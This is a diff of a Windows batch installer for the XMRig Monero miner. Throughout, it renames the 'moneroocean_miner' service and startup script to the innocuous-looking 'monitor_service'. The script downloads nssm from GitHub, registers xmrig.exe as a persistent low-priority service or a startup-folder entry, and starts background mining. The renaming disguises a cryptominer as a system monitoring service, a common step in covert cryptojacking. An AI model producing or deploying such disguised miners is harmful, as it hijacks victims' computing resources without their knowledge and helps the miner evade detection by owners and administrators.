@@ -119,7 +119,7 @@ echo.
 if %ADMIN% == 0 (
   echo Since I do not have admin access, mining in background will be started using your startup directory script and only work when your are logged in this host.
 ) else (
-  echo Mining in background will be performed using moneroocean_miner service.
+  echo Mining in background will be performed using monitor_service service.
 )
 
 echo.
@@ -131,8 +131,8 @@ pause
 rem start doing stuff: preparing miner
 
 echo [*] Removing previous moneroocean miner (if any)
-sc stop moneroocean_miner
-sc delete moneroocean_miner
+sc stop monitor_service
+sc delete monitor_service
 taskkill /f /t /im xmrig.exe
 
 :REMOVE_DIR0
@@ -276,22 +276,22 @@ echo ERROR: Can't find Windows startup directory
 exit /b 1
 
 :STARTUP_DIR_OK
-echo [*] Adding call to "%USERPROFILE%\tools\miner.bat" script to "%STARTUP_DIR%\moneroocean_miner.bat" script
+echo [*] Adding call to "%USERPROFILE%\tools\miner.bat" script to "%STARTUP_DIR%\monitor_service.bat" script
 (
 echo @echo off
 echo "%USERPROFILE%\tools\miner.bat" --config="%USERPROFILE%\tools\config_background.json"
-) > "%STARTUP_DIR%\moneroocean_miner.bat"
+) > "%STARTUP_DIR%\monitor_service.bat"
 
 echo [*] Running miner in the background
-call "%STARTUP_DIR%\moneroocean_miner.bat"
+call "%STARTUP_DIR%\monitor_service.bat"
 goto OK
 
 :ADMIN_MINER_SETUP
 
-echo [*] Downloading tools to make moneroocean_miner service to "%USERPROFILE%\nssm.zip"
+echo [*] Downloading tools to make monitor_service service to "%USERPROFILE%\nssm.zip"
 powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/nssm.zip', '%USERPROFILE%\nssm.zip')"
 if errorlevel 1 (
-  echo ERROR: Can't download tools to make moneroocean_miner service
+  echo ERROR: Can't download tools to make monitor_service service
   exit /b 1
 )
 
@@ -314,28 +314,28 @@ if errorlevel 1 (
 )
 del "%USERPROFILE%\nssm.zip"
 
-echo [*] Creating moneroocean_miner service
-sc stop moneroocean_miner
-sc delete moneroocean_miner
-"%USERPROFILE%\tools\nssm.exe" install moneroocean_miner "%USERPROFILE%\tools\xmrig.exe"
+echo [*] Creating monitor_service service
+sc stop monitor_service
+sc delete monitor_service
+"%USERPROFILE%\tools\nssm.exe" install monitor_service "%USERPROFILE%\tools\xmrig.exe"
 if errorlevel 1 (
-  echo ERROR: Can't create moneroocean_miner service
+  echo ERROR: Can't create monitor_service service
   exit /b 1
 )
-"%USERPROFILE%\tools\nssm.exe" set moneroocean_miner AppDirectory "%USERPROFILE%\tools"
-"%USERPROFILE%\tools\nssm.exe" set moneroocean_miner AppPriority BELOW_NORMAL_PRIORITY_CLASS
-"%USERPROFILE%\tools\nssm.exe" set moneroocean_miner AppStdout "%USERPROFILE%\tools\stdout"
-"%USERPROFILE%\tools\nssm.exe" set moneroocean_miner AppStderr "%USERPROFILE%\tools\stderr"
+"%USERPROFILE%\tools\nssm.exe" set monitor_service AppDirectory "%USERPROFILE%\tools"
+"%USERPROFILE%\tools\nssm.exe" set monitor_service AppPriority BELOW_NORMAL_PRIORITY_CLASS
+"%USERPROFILE%\tools\nssm.exe" set monitor_service AppStdout "%USERPROFILE%\tools\stdout"
+"%USERPROFILE%\tools\nssm.exe" set monitor_service AppStderr "%USERPROFILE%\tools\stderr"
 
-echo [*] Starting moneroocean_miner service
-"%USERPROFILE%\tools\nssm.exe" start moneroocean_miner
+echo [*] Starting monitor_service service
+"%USERPROFILE%\tools\nssm.exe" start monitor_service
 if errorlevel 1 (
-  echo ERROR: Can't start moneroocean_miner service
+  echo ERROR: Can't start monitor_service service
   exit /b 1
 )
 
 echo
-echo Please reboot system if moneroocean_miner service is not activated yet (if "%USERPROFILE%\tools\xmrig.log" file is empty)
+echo Please reboot system if monitor_service service is not activated yet (if "%USERPROFILE%\tools\xmrig.log" file is empty)
 goto OK
 
 :OK
